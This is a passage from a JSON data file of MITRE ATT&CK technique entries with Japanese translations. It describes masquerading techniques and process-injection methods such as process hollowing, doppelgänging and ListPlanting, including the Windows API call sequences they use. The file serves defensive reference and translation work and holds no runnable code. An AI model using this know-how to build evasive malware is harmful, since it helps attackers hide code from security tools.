file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.",
                        "description_jp": "攻撃者は、真のファイルタイプを偽装する手段として、ファイル名に二重拡張子を悪用する可能性があります。ファイル名には、最初の拡張子のみが表示される可能性のある2番目のファイルタイプ拡張子が含まれる場合があります（例：<code>File.txt.exe</code>は一部のビューでは<code>File.txt</code>としてのみレンダリングされる場合があります）。ただし、2番目の拡張子が、ファイルの開き方と実行方法を決定する真のファイルタイプです。実際のファイル拡張子は、オペレーティングシステムによってファイルブラウザ（例：explorer.exe）や、システムのポリシーと同様またはそれを使用して構成されたソフトウェアで非表示にされる場合があります。(引用: PCMag DoubleExtension)(引用: SOCPrime DoubleExtension)\n\n攻撃者は、ペイロードの危険なファイルタイプを隠蔽しようとして二重拡張子を悪用する可能性があります。非常に一般的な使用法は、ユーザーを騙して無害なファイルタイプだと思わせて開かせ、実際には実行可能コードであるというものです。このようなファイルはしばしばメールの添付ファイルになりすまし、攻撃者が[スピアフィッシング添付ファイル](https://attack.mitre.org/techniques/T1566/001)を介してユーザーのシステムへの[初期アクセス](https://attack.mitre.org/tactics/TA0001)を取得し、その後[ユーザー実行](https://attack.mitre.org/techniques/T1204)を行うことを可能にします。例えば、<code>Evil.txt.exe</code>という名前の実行可能ファイル添付ファイルは、ユーザーには<code>Evil.txt</code>と表示される場合があります。その後、ユーザーはそれを無害なテキストファイルと見なして開き、意図せずに隠されたマルウェアを実行する可能性があります。(引用: SOCPrime DoubleExtension)\n\nテキストファイル（.txt、.docなど）や画像ファイル（.jpg、.gifなど）などの一般的なファイルタイプは、通常、無害に見せるために最初の拡張子として使用されます。.exe、.lnk、.hta、.scrなど、一般的に危険と見なされる実行可能拡張子は、しばしば2番目の拡張子および真のファイルタイプとして表示されます。"
                    },
                    {
                        "id": "T1036.010",
                        "name_eng": "Masquerade Account Name",
                        "name_jp": "アカウント名の偽装",
                        "description_eng": "Adversaries may match or approximate the names of legitimate accounts to make newly created ones appear benign. This will typically occur during [Create Account](https://attack.mitre.org/techniques/T1136), although accounts may also be renamed at a later date. This may also coincide with [Account Access Removal](https://attack.mitre.org/techniques/T1531) if the actor first deletes an account before re-creating one with the same name.(Citation: Huntress MOVEit 2023)\n\nOften, adversaries will attempt to masquerade as service accounts, such as those associated with legitimate software, data backups, or container cluster management.(Citation: Elastic CUBA Ransomware 2022)(Citation: Aquasec Kubernetes Attack 2023) They may also give accounts generic, trustworthy names, such as “admin”, “help”, or “root.”(Citation: Invictus IR Cloud Ransomware 2024) Sometimes adversaries may model account names off of those already existing in the system, as a follow-on behavior to [Account Discovery](https://attack.mitre.org/techniques/T1087).  \n\nNote that this is distinct from [Impersonation](https://attack.mitre.org/techniques/T1656), which describes impersonating specific trusted individuals or organizations, rather than user or service account names.",
                        "description_jp": "攻撃者は、新しく作成したアカウントを無害に見せるために、正当なアカウントの名前と一致させたり、近似させたりする可能性があります。これは通常、[アカウントの作成](https://attack.mitre.org/techniques/T1136)中に行われますが、アカウントは後で名前変更されることもあります。攻撃者が最初にアカウントを削除してから同じ名前で再作成する場合、これは[アカウントアクセスの削除](https://attack.mitre.org/techniques/T1531)と同時に発生する可能性もあります。(引用: Huntress MOVEit 2023)\n\n多くの場合、攻撃者は、正当なソフトウェア、データバックアップ、またはコンテナクラスター管理に関連付けられているものなど、サービスアカウントになりすまそうとします。(引用: Elastic CUBA Ransomware 2022)(引用: Aquasec Kubernetes Attack 2023) また、「admin」、「help」、「root」など、一般的で信頼できる名前をアカウントに与えることもあります。(引用: Invictus IR Cloud Ransomware 2024) 場合によっては、攻撃者は[アカウントの発見](https://attack.mitre.org/techniques/T1087)の追跡行動として、システムに既に存在するアカウントをモデルにしたアカウント名を作成することもあります。\n\nこれは、ユーザー名やサービスアカウント名ではなく、特定の信頼できる個人や組織になりすますことを記述する[偽装](https://attack.mitre.org/techniques/T1656)とは異なることに注意してください。"
                    },
                    {
                        "id": "T1036.001",
                        "name_eng": "Invalid Code Signature",
                        "name_jp": "無効なコード署名",
                        "description_eng": "Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.(Citation: Threatexpress MetaTwin 2017)\n\nUnlike [Code Signing](https://attack.mitre.org/techniques/T1553/002), this activity will not result in a valid signature.",
                        "description_jp": "攻撃者は、ユーザー、アナリスト、またはツールを欺く可能性を高めるために、有効なコード署名の機能を模倣しようとする可能性があります。コード署名は、開発者からのバイナリの信頼性のレベルと、バイナリが改ざんされていないことの保証を提供します。攻撃者は署名済みプログラムからメタデータと署名情報をコピーし、それを未署名プログラムのテンプレートとして使用できます。無効なコード署名を持つファイルはデジタル署名検証チェックに失敗しますが、ユーザーにはより正当に見え、セキュリティツールがこれらのファイルを不適切に処理する可能性があります。(引用: Threatexpress MetaTwin 2017)\n\n[コード署名](https://attack.mitre.org/techniques/T1553/002)とは異なり、このアクティビティは有効な署名にはなりません。"
                    },
                    {
                        "id": "T1036.009",
                        "name_eng": "Break Process Trees",
                        "name_jp": "プロセスツリーの破壊",
                        "description_eng": "An adversary may attempt to evade process tree-based analysis by modifying executed malware's parent process ID (PPID). If endpoint protection software leverages the “parent-child\" relationship for detection, breaking this relationship could result in the adversary’s behavior not being associated with previous process tree activity. On Unix-based systems breaking this process tree is common practice for administrators to execute software using scripts and programs.(Citation: 3OHA double-fork 2022) \n\nOn Linux systems, adversaries may execute a series of [Native API](https://attack.mitre.org/techniques/T1106) calls to alter malware's process tree. For example, adversaries can execute their payload without any arguments, call the `fork()` API call twice, then have the parent process exit. This creates a grandchild process with no parent process that is immediately adopted by the `init` system process (PID 1), which successfully disconnects the execution of the adversary's payload from its previous process tree.\n\nAnother example is using the “daemon” syscall to detach from the current parent process and run in the background.(Citation: Sandfly BPFDoor 2022)(Citation: Microsoft XorDdos Linux Stealth 2022)",
                        "description_jp": "攻撃者は、実行されたマルウェアの親プロセスID（PPID）を変更することにより、プロセスツリーベースの分析を回避しようとする可能性があります。エンドポイント保護ソフトウェアが検出に「親子」関係を利用する場合、この関係を破壊すると、攻撃者の動作が以前のプロセスツリーアクティビティに関連付けられなくなる可能性があります。Unixベースのシステムでは、このプロセスツリーを破壊することは、管理者がスクリプトやプログラムを使用してソフトウェアを実行するための一般的な方法です。(引用: 3OHA double-fork 2022)\n\nLinuxシステムでは、攻撃者は一連の[ネイティブAPI](https://attack.mitre.org/techniques/T1106)呼び出しを実行して、マルウェアのプロセスツリーを変更する可能性があります。例えば、攻撃者は引数なしでペイロードを実行し、`fork()` API呼び出しを2回呼び出し、その後親プロセスを終了させることができます。これにより、親プロセスのない孫プロセスが作成され、直ちに`init`システムプロセス（PID 1）によって養子縁組され、攻撃者のペイロードの実行を以前のプロセスツリーから正常に切断します。\n\n別の例としては、「daemon」システムコールを使用して現在の親プロセスから切り離し、バックグラウンドで実行することが挙げられます。(引用: Sandfly BPFDoor 2022)(引用: Microsoft XorDdos Linux Stealth 2022)"
                    }
                ]
            },
            {
                "id": "T1055",
                "name_eng": "Process Injection",
                "name_jp": "プロセスインジェクション",
                "description_eng": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",
                "description_jp": "攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、プロセスにコードを注入する可能性があります。プロセスインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースにアクセスでき、場合によっては権限が昇格される可能性があります。プロセスインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。\n\nプロセスにコードを注入する方法は多数あり、その多くは正当な機能を悪用しています。これらの実装は主要なOSすべてに存在しますが、通常はプラットフォーム固有です。\n\nより高度なサンプルでは、モジュールをセグメント化し、検出をさらに回避するために複数のプロセスインジェクションを実行し、通信チャネルとして名前付きパイプやその他のプロセス間通信（IPC）メカニズムを利用する場合があります。",
                "subtechniques": [
                    {
                        "id": "T1055.013",
                        "name_eng": "Process Doppelgänging",
                        "name_jp": "プロセスドッペルゲンギング",
                        "description_eng": "Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process. \n\nWindows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)\n\nAlthough deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelgänging Dec 2017)\n\nAdversaries may abuse TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055). Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>, and <code>SetThreadContext</code>. (Citation: BlackHat Process Doppelgänging Dec 2017)\n\nProcess Doppelgänging is implemented in 4 steps (Citation: BlackHat Process Doppelgänging Dec 2017):\n\n* Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.\n* Load – Create a shared section of memory and load the malicious executable.\n* Rollback – Undo changes to original executable, effectively removing malicious code from the file system.\n* Animate – Create a process from the tainted section of memory and initiate execution.\n\nThis behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process.",
                        "description_jp": "攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、プロセスドッペルゲンギングを介してプロセスに悪意のあるコードを注入する可能性があります。プロセスドッペルゲンギングは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。\n\nWindows Transactional NTFS (TxF) は、安全なファイル操作を実行する手法としてVistaで導入されました。(引用: Microsoft TxF) データ整合性を確保するため、TxFは特定の時点でファイルに書き込むことができるトランザクションハンドルを1つだけにします。書き込みハンドルトランザクションが終了するまで、他のすべてのハンドルは書き込み元から分離され、ハンドルが開かれた時点で存在したファイルのコミット済みバージョンのみを読み取ることができます。(引用: Microsoft Basic TxF Concepts) 破損を避けるため、書き込みトランザクション中にシステムまたはアプリケーションに障害が発生した場合、TxFは自動ロールバックを実行します。(引用: Microsoft Where to use TxF)\n\n非推奨ですが、TxFアプリケーションプログラミングインターフェイス（API）はWindows 10の時点でも有効です。(引用: BlackHat Process Doppelgänging Dec 2017)\n\n攻撃者はTxFを悪用して、[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)のファイルレスバリエーションを実行する可能性があります。[プロセスハロウイング](https://attack.mitre.org/techniques/T1055/012)と同様に、プロセスドッペルゲンギングは正当なプロセスのメモリを置き換え、防御や検出を回避する可能性のある悪意のあるコードの隠蔽された実行を可能にします。プロセスドッペルゲンギングによるTxFの使用は、<code>NtUnmapViewOfSection</code>、<code>VirtualProtectEx</code>、<code>SetThreadContext</code>などの監視の厳しいAPI関数の使用も回避します。(引用: BlackHat Process Doppelgänging Dec 2017)\n\nプロセスドッペルゲンギングは4つのステップで実装されます(引用: BlackHat Process Doppelgänging Dec 2017):\n\n* トランザクト – 正当な実行可能ファイルを使用してTxFトランザクションを作成し、その後、ファイルを悪意のあるコードで上書きします。これらの変更は分離され、トランザクションのコンテキスト内でのみ表示されます。\n* ロード – メモリの共有セクションを作成し、悪意のある実行可能ファイルをロードします。\n* ロールバック – 元の実行可能ファイルへの変更を元に戻し、ファイルシステムから悪意のあるコードを効果的に削除します。\n* アニメート – 汚染されたメモリセクションからプロセスを作成し、実行を開始します。\n\n注入されたプロセスは注入元のプロセスから生成された（したがってセキュリティコンテキストを継承する）ため、この動作によって権限が昇格される可能性は低いでしょう。ただし、プロセスドッペルゲンギングによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性があります。"
                    },
                    {
                        "id": "T1055.012",
                        "name_eng": "Process Hollowing",
                        "name_jp": "プロセスハロウイング",
                        "description_eng": "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \n\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Leitch Hollowing)(Citation: Elastic Process Injection July 2017)\n\nThis is very similar to [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.",
                        "description_jp": "攻撃者は、プロセスベースの防御を回避するために、中断され空洞化されたプロセスに悪意のあるコードを注入する可能性があります。プロセスハロウイングは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。\n\nプロセスハロウイングは通常、プロセスを中断状態で作成し、そのメモリをアンマップ/空洞化し、その後悪意のあるコードに置き換えることによって実行されます。被害者プロセスは、プロセスのプライマリスレッドを中断するフラグを含む<code>CreateProcess</code>などのネイティブWindows API呼び出しで作成できます。この時点で、プロセスは<code>ZwUnmapViewOfSection</code>や<code>NtUnmapViewOfSection</code>などのAPI呼び出しを使用してアンマップされた後、書き込まれ、注入されたコードに再配置され、それぞれ<code>VirtualAllocEx</code>、<code>WriteProcessMemory</code>、<code>SetThreadContext</code>、そして<code>ResumeThread</code>を介して再開されます。(引用: Leitch Hollowing)(引用: Elastic Process Injection July 2017)\n\nこれは[スレッドローカルストレージ](https://attack.mitre.org/techniques/T1055/005)と非常によく似ていますが、既存のプロセスをターゲットにするのではなく、新しいプロセスを作成します。注入されたプロセスは注入元のプロセスから生成された（したがってセキュリティコンテキストを継承する）ため、この動作によって権限が昇格される可能性は低いでしょう。ただし、プロセスハロウイングによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。"
                    },
                    {
                        "id": "T1055.009",
                        "name_eng": "Proc Memory",
                        "name_jp": "Procメモリ",
                        "description_eng": "Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. \n\nProc memory injection involves enumerating the memory of a process via the /proc filesystem (<code>/proc/[pid]</code>) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes’ memory map within <code>/proc/[pid]/maps</code> can be overwritten using dd.(Citation: Uninformed Needle)(Citation: GDS Linux Injection)(Citation: DD Man) \n\nOther techniques such as [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) may be used to populate a target process with more available gadgets. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), proc memory injection may target child processes (such as a backgrounded copy of sleep).(Citation: GDS Linux Injection) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process.",
                        "description_jp": "攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、/procファイルシステムを介してプロセスに悪意のあるコードを注入する可能性があります。Procメモリインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。\n\nProcメモリインジェクションは、/procファイルシステム（<code>/proc/[pid]</code>）を介してプロセスのメモリを列挙し、利用可能なガジェット/命令でリターン指向プログラミング（ROP）ペイロードを作成することを含みます。実行中の各プロセスには、メモリマッピングを含む独自のディレクトリがあります。Procメモリインジェクションは、通常、/procファイルシステムによって提供されるメモリマッピングを使用してターゲットプロセスのスタックを上書きすることによって実行されます。この情報は、アドレス空間配置のランダム化（ASLR）などのプロセスメモリ保護によって隠されているオフセット（スタックを含む）やガジェット（悪意のあるペイロードを構築するために使用できるプログラム内の命令）を列挙するために使用できます。列挙されると、<code>/proc/[pid]/maps</code>内のターゲットプロセスのメモリマップはddを使用して上書きできます。(引用: Uninformed Needle)(引用: GDS Linux Injection)(引用: DD Man)\n\n[ダイナミックリンカーハイジャック](https://attack.mitre.org/techniques/T1574/006)などの他のテクニックを使用して、ターゲットプロセスにより多くの利用可能なガジェットを投入することができます。[プロセスハロウイング](https://attack.mitre.org/techniques/T1055/012)と同様に、procメモリインジェクションは子プロセス（バックグラウンドで実行されているsleepのコピーなど）をターゲットにする場合があります。(引用: GDS Linux Injection)\n\n別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。procメモリインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。"
                    },
                    {
                        "id": "T1055.015",
                        "name_eng": "ListPlanting",
                        "name_jp": "リストプランティング",
                        "description_eng": "Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process.(Citation: Hexacorn Listplanting) Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.\n\nList-view controls are user interface windows used to display collections of items.(Citation: Microsoft List View Controls) Information about an application's list-view settings are stored within the process' memory in a <code>SysListView32</code> control.\n\nListPlanting (a form of message-passing \"shatter attack\") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items.(Citation: Modexp Windows Process Injection) Adversaries must first copy code into the target process’ memory space, which can be performed various ways including by directly obtaining a handle to the <code>SysListView32</code> child of the victim process window (via Windows API calls such as <code>FindWindow</code> and/or <code>EnumWindows</code>) or other [Process Injection](https://attack.mitre.org/techniques/T1055) methods.\n\nSome variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored <code>WriteProcessMemory</code> function. For example, an adversary can use the <code>PostMessage</code> and/or <code>SendMessage</code> API functions to send <code>LVM_SETITEMPOSITION</code> and <code>LVM_GETITEMPOSITION</code> messages, effectively copying a payload 2 bytes at a time to the allocated memory.(Citation: ESET InvisiMole June 2020) \n\nFinally, the payload is triggered by sending the <code>LVM_SORTITEMS</code> message to the <code>SysListView32</code> child of the process window, with the payload within the newly allocated buffer passed and executed as the <code>ListView_SortItems</code> callback.",
                        "description_jp": "攻撃者は、リストビューコントロールを悪用して、乗っ取ったプロセスに悪意のあるコードを注入し、プロセスベースの防御を回避したり、権限を昇格させたりする可能性があります。ListPlantingは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。(引用: Hexacorn Listplanting) ListPlanting経由で実行されるコードは、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。\n\nリストビューコントロールは、アイテムのコレクションを表示するために使用されるユーザーインターフェイスウィンドウです。(引用: Microsoft List View Controls) アプリケーションのリストビュー設定に関する情報は、プロセスのメモリ内の<code>SysListView32</code>コントロールに保存されます。\n\nListPlanting（メッセージパッシング「シャッター攻撃」の一形態）は、リストビューコントロールを使用するプロセスの仮想アドレス空間にコードをコピーし、そのコードをリストされたアイテムのソート用のカスタムコールバックとして使用することによって実行される場合があります。(引用: Modexp Windows Process Injection) 攻撃者はまず、ターゲットプロセスのメモリス空間にコードをコピーする必要があります。これは、被害者プロセスウィンドウの<code>SysListView32</code>の子へのハンドルを直接取得する（<code>FindWindow</code>や<code>EnumWindows</code>などのWindows API呼び出しを介して）か、他の[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)メソッドを含むさまざまな方法で実行できます。\n\nListPlantingのいくつかのバリエーションでは、ターゲットプロセスにメモリを割り当てた後、ウィンドウメッセージを使用してペイロードをコピーし、監視の厳しい<code>WriteProcessMemory</code>関数の使用を回避する場合があります。例えば、攻撃者は<code>PostMessage</code>や<code>SendMessage</code> API関数を使用して<code>LVM_SETITEMPOSITION</code>および<code>LVM_GETITEMPOSITION</code>メッセージを送信し、ペイロードを一度に2バイトずつ割り当てられたメモリに効果的にコピーすることができます。(引用: ESET InvisiMole June 2020)\n\n最後に、ペイロードは、プロセスウィンドウの<code>SysListView32</code>の子に<code>LVM_SORTITEMS</code>メッセージを送信することによってトリガーされ、新しく割り当てられたバッファ内のペイロードが<code>ListView_SortItems</code>コールバックとして渡されて実行されます。"
                    },
                    {
                        "id": "T1055.014",
                        "name_eng": "VDSO Hijacking",
                        "name_jp": "VDSOハイジャック",
                        "description_eng": "Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nVDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via [Ptrace System Calls](https://attack.mitre.org/techniques/T1055/008). However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).(Citation: ELF Injection May 2009)(Citation: Backtrace VDSO)(Citation: VDSO Aug 2005)(Citation: Syscall 2014)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.",
                        "description_jp": "攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、VDSOハイジャックを介してプロセスに悪意のあるコードを注入する可能性があります。仮想動的共有オブジェクト（vdso）ハイジャックは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。\n\nVDSOハイジャックは、動的にリンクされた共有ライブラリへの呼び出しをリダイレクトすることを含みます。メモリ保護により、[Ptraceシステムコール](https://attack.mitre.org/techniques/T1055/008)を介してプロセスに実行可能コードを書き込むことが妨げられる場合があります。ただし、攻撃者はvdso共有オブジェクトからプロセスにマップされたsyscallインターフェイスコードスタブをハイジャックして、悪意のある共有オブジェクトを開いてマップするためのsyscallを実行する可能性があります。このコードは、プロセスのグローバルオフセットテーブル（マップされたライブラリ関数の絶対アドレスを格納）に格納されているパッチ適用済みのメモリアドレス参照を介してプロセスの実行フローをリダイレクトすることによって呼び出すことができます。(引用: ELF Injection May 2009)(引用: Backtrace VDSO)(引用: VDSO Aug 2005)(引用: Syscall 2014)\n\n別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。VDSOハイジャックによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。"
                    },
                    {
                        "id": "T1055.005",
                        "name_eng": "Thread Local Storage",
                        "name_jp": "スレッドローカルストレージ",
                        "description_eng": "Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. \n\nTLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other [Process Injection](https://attack.mitre.org/techniques/T1055) techniques such as [Process Hollowing](https://attack.mitre.org/techniques/T1055/012).(Citation: FireEye TLS Nov 2017)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process.",
                        "description_jp": "攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、スレッドローカルストレージ（TLS）コールバックを介してプロセスに悪意のあるコードを注入する可能性があります。TLSコールバックインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。\n\nTLSコールバックインジェクションは、ポータブル実行可能ファイル（PE）内のポインタを操作して、コードの正当なエントリポイントに到達する前にプロセスを悪意のあるコードにリダイレクトすることを含みます。TLSコールバックは通常、スレッドが使用するデータのセットアップやクリーンアップのためにOSによって使用されます。TLSコールバックの操作は、[プロセスハロウイング](https://attack.mitre.org/techniques/T1055/012)などの他の[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)テクニックを使用して、プロセスのメモリス空間内の特定のオフセットに割り当てて書き込むことによって実行される場合があります。(引用: FireEye TLS Nov 2017)\n\n別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。TLSコールバックインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。"
                    },
                    {
                        "id": "T1055.011",
                        "name_eng": "Extra Window Memory Injection",
                        "name_jp": "追加ウィンドウメモリインジェクション",
                        "description_eng": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.",
                        "description_jp": "攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、追加ウィンドウメモリ（EWM）を介してプロセスに悪意のあるコードを注入する可能性があります。EWMインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。\n\nウィンドウを作成する前に、グラフィカルなWindowsベースのプロセスは、外観と動作を規定するウィンドウクラスを規定または登録する必要があります（データの入出力を処理する関数であるウィンドウプロシージャを介して）。(引用: Microsoft Window Classes) 新しいウィンドウクラスの登録には、そのクラスの各インスタンスの割り当て済みメモリに追加される最大40バイトのEWMのリクエストを含めることができます。このEWMは、そのウィンドウに固有のデータを格納することを目的としており、その値を設定および取得するための特定のアプリケーションプログラミングインターフェイス（API）関数を持っています。(引用: Microsoft GetWindowLong function)(引用: Microsoft SetWindowLong function)\n\n小さいながらも、EWMは32ビットポインタを格納するのに十分な大きさであり、ウィンドウプロシージャを指すためによく使用されます。マルウェアは、プロセスのメモリの共有セクションにコードを書き込み、EWMにコードへのポインタを配置し、プロセスのEWM内のアドレスに実行制御を返すことによって実行を呼び出すことを含む攻撃チェーンの一部として、このメモリロケーションを利用する可能性があります。\n\nEWMインジェクションを介して付与された実行は、ターゲットプロセスのメモリと、場合によっては昇格された権限の両方へのアクセスを許可する可能性があります。共有セクションへのペイロードの書き込みは、<code>WriteProcessMemory</code>や<code>CreateRemoteThread</code>などの監視の厳しいAPI呼び出しの使用も回避します。(引用: Elastic Process Injection July 2017) より高度なマルウェアサンプルは、ターゲットプロセスの実行可能部分内に悪意のあるペイロードを書き換えるウィンドウプロシージャと他のシステム関数の組み合わせをトリガーすることによって、データ実行防止（DEP）などの保護メカニズムをバイパスする可能性もあります。(引用: MalwareTech Power Loader Aug 2013)(引用: WeLiveSecurity Gapz and Redyms Mar 2013)\n\n別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。EWMインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。"
                    },
                    {
